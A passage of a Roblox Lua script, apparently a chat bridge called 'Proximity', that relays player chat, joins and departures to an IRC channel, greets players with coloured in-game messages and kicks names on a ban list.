	API:JoinChannel(con,channel)

end

LeaveChannel=function(channel,reason)

	API:LeaveChannel(con,channel,reason)

end

function ircprint(msg) Chat(msg,"#Proximity_IRC","OUTPUT")end

coroutine.resume(coroutine.create(function()
				for i,v in pairs(game:GetService'Players':GetPlayers()) do
					v.Chatted:connect(function(msg) local t=tostring(v)
						Chat(tostring(msg),'#Proximity_IRC',t)
					end)
				end
				game:GetService'Players'.PlayerAdded:connect(function(p)
					local r=tostring(p)
					Chat(p.Name.." has joined.",'#Proximity_IRC',r)
					SendAll(p.Name.." has joined.",		
								BrickColor.new("Dark green").Color,
								Enum.Font.SourceSansBold,
								Enum.FontSize.Size18)
Send(p,
		("Proximity: Welcome "..p.Name),
		BrickColor.new("Bright orange").Color,
		Enum.Font.SourceSansBold,
		Enum.FontSize.Size18
)


					
					p.Chatted:connect(function(m) local r=tostring(p)
					Chat(tostring(m),'#Proximity_IRC',r)
					end)
					end)
				game:GetService'Players'.PlayerRemoving:connect(function(p)
					local r=tostring(p)
					Chat(p.Name.." has left.",'#Proximity_IRC',r)
					SendAll(p.Name.." has left.",		
								BrickColor.new("Really red").Color,
								Enum.Font.SourceSansBold,
								Enum.FontSize.Size18)
				end)
		end))
wait(1)
SendAll(
	'Proximity: Connected',
		BrickColor.new("Dark green").Color,
		Enum.Font.SourceSansBold,
		Enum.FontSize.Size18
)
wait(.5)
for _,p in pairs (game:GetService'Players':GetPlayers())do

Send(p,  
	("Proximity: Welcome "..p.Name),
		BrickColor.new("Bright orange").Color,
		Enum.Font.SourceSansBold,
		Enum.FontSize.Size18
)

end

game:GetService("Players").PlayerAdded:connect(function(Plr)
	if Banned[Plr.Name] then
		Plr:Kick(Banned[Plr.Name].Reason)
	end
end)

return nil
